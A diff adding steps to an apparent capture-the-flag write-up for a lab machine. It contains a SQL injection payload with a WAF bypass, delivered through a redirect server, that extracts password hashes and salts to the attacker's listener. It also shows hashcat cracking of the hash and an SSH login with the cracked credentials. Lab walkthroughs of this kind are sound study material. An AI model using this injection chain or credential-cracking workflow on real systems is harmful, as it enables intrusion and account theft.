@@ -246,13 +246,15 @@ Note: From hacktricks this is a WAF bypass and no whitespace is needed in the UR
 ```https://book.hacktricks.xyz/pentesting-web/sql-injection```
 
 
+Input the the payload as follows.
+
 ```
 └─$ python2.7 redirect.py --port 80 --ip 10.10.16.19 "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,(select/**/passwd/**/from/**/user),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--"
 serving at port 80
 10.129.61.202 - - [05/Oct/2022 15:18:37] "GET / HTTP/1.0" 301 -
 ```
 
-The following payload gives us back a hashed password.
+On our listner we will capture a hashed password and the username susanne
 
 ```66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37```
 
@@ -291,11 +293,29 @@ Content-Length: 754
 {"webhookUrl":"http:\/\/10.10.16.19:1234","monitoredUrl":"http:\/\/10.10.16.19","health":"up","body":"{\"data\":[{\"username\":\"susanne\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce\"},{\"username\":\"sO3XIbeW14\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/1\"}],\"ok\":true}","message":"HTTP\/1.0 301 Moved Permanently","headers":{"Server":"SimpleHTTP\/0.6 Python\/2.7.18","Date":"Wed, 05 Oct 2022 21:06:48 GMT","Location":"http:\/\/127.0.0.1:3000\/api\/v1\/users\/search?q=')\/**\/union\/**\/all\/**\/select\/**\/1,1,(select\/**\/salt\/**\/from\/**\/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--","Content-Type":"application\/json; charset=UTF-8","Set-Cookie":"_csrf=; Path=\/; Max-Age=0","Content-Length":"174"}}
 ```
 
+For this hash cracking portion help was needed and appreciated
+
+Now in order to actually decrypt this hash we have to convert back into hex and then base64.
 
 ```console
 └─$ echo '66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37' | xxd -r -ps | base64
 ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
 ```
+
+Then also base64 encode the salt.
+
+Note: it is also required to take off the ```o=```
+
+```console
+└─$ echo 'sO3XIbeW14' |base64    
+c08zWEliZVcxNAo=
+```
+
+Then create a file and put ```sha256:10000:c08zWEliZVcxNA:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=``` inside it
+
+Run hashcat and it will auto detect it as PBKDF2-HMAC-SHA256.
+
+Then we finally get the password february 15!
 
 ```console
 └─$ hashcat  hash /usr/share/wordlists/rockyou.txt  
@@ -359,9 +379,12 @@ Candidates.#1....: 030979 -> 280282
 Hardware.Mon.#1..: Util: 98%
 ```
 
+Now we can login with the credentials we cracked.
+
+```
 susanne
 february15
-
+```
 
 ```
 └─$ ssh susanne@health.htb                         
